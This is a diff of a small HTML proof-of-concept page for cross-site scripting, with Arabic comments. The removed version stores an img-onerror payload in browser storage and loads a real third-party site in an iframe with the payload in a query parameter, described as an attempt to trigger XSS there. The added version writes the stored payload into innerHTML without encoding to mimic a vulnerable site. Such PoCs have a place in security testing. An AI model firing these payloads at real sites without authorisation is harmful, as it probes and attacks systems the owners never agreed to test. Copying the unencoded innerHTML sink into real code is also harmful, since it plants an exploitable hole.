@@ -1,34 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>XSS PoC - Auto Inject</title>
-  <script>
-    const payload = `<img src=x onerror=alert('🔥 Remote XSS Executed')>`;
-
-    // 1. تخزين الحمولة
-    localStorage.setItem("xss_payload", payload);
-    sessionStorage.setItem("xss_payload", payload);
-    window.name = payload;
-
-    // 2. توليد رابط بارامتر
-    const target = "https://thebrowser.company/";
-    const urlWithParam = `${target}?xss=${encodeURIComponent(payload)}`;
-
-    // 3. تحميل الصفحة الهدف داخل iframe
-    setTimeout(() => {
-      const iframe = document.createElement("iframe");
-      iframe.src = urlWithParam;
-      iframe.style = "width:100%;height:90vh;border:2px solid red;";
-      document.body.appendChild(iframe);
-    }, 1000);
-
-    // 4. رسالة توضيحية
-    window.onload = () => {
-      document.body.insertAdjacentHTML("afterbegin", `<h2>✅ محاولة تفجير XSS في <code>${target}</code></h2>`);
-    };
-  </script>
+  <title>PoC - Stored XSS via localStorage</title>
 </head>
 <body>
+  <h2>✅ إذا ظهرت نافذة تنبيه (alert)، فهذا دليل على نجاح تنفيذ XSS.</h2>
+
+  <script>
+    // تخزين الحمولة في localStorage
+    localStorage.setItem('xss_payload', '<img src=x onerror=alert("🔥 XSS Executed from localStorage")>');
+
+    // استرجاعها وعرضها داخل innerHTML بدون ترميز — هذا يُحاكي السلوك الضعيف في المواقع
+    const container = document.createElement('div');
+    container.innerHTML = localStorage.getItem('xss_payload');
+    document.body.appendChild(container);
+  </script>
 </body>
 </html>
